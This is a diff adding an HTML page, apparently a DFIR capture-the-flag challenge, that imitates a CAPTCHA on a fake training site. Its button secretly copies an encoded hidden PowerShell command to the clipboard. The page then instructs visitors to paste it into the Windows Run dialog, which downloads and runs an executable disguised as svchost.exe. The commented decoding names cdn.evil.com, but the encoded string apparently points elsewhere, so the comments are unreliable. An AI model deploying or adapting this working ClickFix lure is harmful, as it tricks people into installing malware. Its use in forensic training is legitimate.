@@ -1,0 +1,249 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title> Hexploit Alliance - Professional Cybersecurity Training</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .header {
+            background: rgba(255, 255, 255, 0.95);
+            padding: 20px 0;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+
+        .logo {
+            font-size: 28px;
+            font-weight: bold;
+            color: #667eea;
+        }
+
+        .main-content {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 40px 20px;
+        }
+
+        .verification-modal {
+            background: white;
+            border-radius: 12px;
+            padding: 40px;
+            max-width: 500px;
+            width: 100%;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            text-align: center;
+        }
+
+        .verification-modal h1 {
+            color: #2563eb;
+            font-size: 32px;
+            margin-bottom: 20px;
+        }
+
+        .verification-modal p {
+            color: #4b5563;
+            font-size: 16px;
+            margin-bottom: 30px;
+        }
+
+        .captcha-box {
+            background: #2563eb;
+            color: white;
+            padding: 20px 30px;
+            border-radius: 8px;
+            margin-bottom: 30px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 15px;
+            font-size: 18px;
+        }
+
+        .captcha-box:hover {
+            background: #1d4ed8;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(37, 99, 235, 0.4);
+        }
+
+        .captcha-icon {
+            width: 40px;
+            height: 40px;
+        }
+
+        .instructions-box {
+            background: #f9fafb;
+            border: 2px solid #e5e7eb;
+            border-radius: 8px;
+            padding: 25px;
+            text-align: left;
+        }
+
+        .instructions-box h2 {
+            font-size: 20px;
+            margin-bottom: 15px;
+            color: #1f2937;
+        }
+
+        .instructions-box ol {
+            list-style-position: inside;
+            color: #4b5563;
+            font-size: 15px;
+        }
+
+        .instructions-box li {
+            margin-bottom: 10px;
+            line-height: 1.6;
+        }
+
+        .instructions-box li strong {
+            font-family: 'Courier New', monospace;
+            background: #e5e7eb;
+            padding: 2px 6px;
+            border-radius: 3px;
+        }
+
+        .success-message {
+            display: none;
+            background: #10b981;
+            color: white;
+            padding: 15px;
+            border-radius: 8px;
+            margin-top: 20px;
+            font-weight: 500;
+        }
+
+        .footer {
+            background: rgba(255, 255, 255, 0.95);
+            padding: 20px 0;
+            text-align: center;
+            color: #6b7280;
+            font-size: 14px;
+        }
+
+        @keyframes pulse {
+            0%, 100% {
+                opacity: 1;
+            }
+            50% {
+                opacity: 0.7;
+            }
+        }
+
+        .captcha-box.clicked {
+            animation: pulse 0.5s ease-in-out;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="container">
+            <div class="logo">🛡️Hexploi Alliance</div>
+        </div>
+    </div>
+
+    <div class="main-content">
+        <div class="verification-modal">
+            <h1>Verify You Are Human</h1>
+            <p>Please verify that you are a human to continue.</p>
+
+            <div class="captcha-box" id="captchaBtn">
+                <svg class="captcha-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <path d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"/>
+                </svg>
+                <span>I'm not a robot</span>
+            </div>
+
+            <div class="instructions-box">
+                <h2>Verification Steps</h2>
+                <ol>
+                    <li>Press Windows Button <strong>⊞ + R</strong></li>
+                    <li>Press <strong>CTRL + V</strong></li>
+                    <li>Press <strong>Enter</strong></li>
+                </ol>
+            </div>
+
+            <div class="success-message" id="successMsg">
+                ✓ Verification command copied to clipboard!
+            </div>
+        </div>
+    </div>
+
+    <div class="footer">
+        <div class="container">
+            © 2026 Hexploit Alliance. Professional Cybersecurity Training & Certifications.
+        </div>
+    </div>
+
+    <script>
+        // ClickFix Malware Loader - DFIR CTF Challenge
+        // WARNING: This is a simulated attack for educational/CTF purposes only
+        
+        // Encoded payload (226 chars - fits in Windows Run dialog 260 char limit)
+        // Decoded command:
+        // iwr cdn.evil.com/l.exe -O $env:temp\svchost.exe;start $env:temp\svchost.exe
+        //
+        // What it does:
+        // 1. Downloads malware from cdn.evil.com/l.exe
+        // 2. Saves as svchost.exe in %TEMP% (masquerading as Windows process)
+        // 3. Executes the malware immediately
+        
+        const maliciousPayload = `powershell -w hidden -enc aQB3AHIAIABoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4AMQAzADcAOgAxADMAMwA3AC8AaQBtAHAAbABhAG4AdAAuAGUAeABlACAALQBPACAAJABlAG4AdgA6AHQAZQBtAHAAXABzAHYAYwBoAG8AcwB0AC4AZQB4AGUAOwBzAHQAYQByAHQAIAAkAGUAbgB2ADoAdABlAG0AcABcAHMAdgBjAGgAbwBzAHQALgBlAHgAZQA`;
+
+        document.getElementById('captchaBtn').addEventListener('click', async function() {
+            try {
+                // Copy malicious payload to clipboard
+                await navigator.clipboard.writeText(maliciousPayload);
+                
+                // Visual feedback
+                this.classList.add('clicked');
+                document.getElementById('successMsg').style.display = 'block';
+                
+                // Log for CTF challenge tracking
+                console.log('[ClickFix] Encoded malware loader copied to clipboard');
+                console.log('[ClickFix] Payload length:', maliciousPayload.length, 'chars (under 260 limit)');
+                console.log('[ClickFix] Encoding: Base64 (UTF-16LE)');
+                console.log('[ClickFix] C2 Domain: cdn.evil.com');
+                console.log('[ClickFix] Malware URL: cdn.evil.com/l.exe');
+                console.log('[ClickFix] Drop path: %TEMP%\\svchost.exe');
+                console.log('[ClickFix] Full payload:', maliciousPayload);
+                
+                setTimeout(() => {
+                    this.classList.remove('clicked');
+                }, 500);
+                
+            } catch (err) {
+                console.error('Clipboard access failed:', err);
+                alert('Please allow clipboard access to continue verification.');
+            }
+        });
+
+        // Additional logging for DFIR analysis
+        console.log('[ClickFix] Malware dropper initialized');
+        console.log('[DFIR] Challenge: Decode the payload and identify IOCs');
+        console.log('[DFIR] Hint: PowerShell -enc uses UTF-16LE Base64 encoding');
+    </script>
+</body>
+</html>
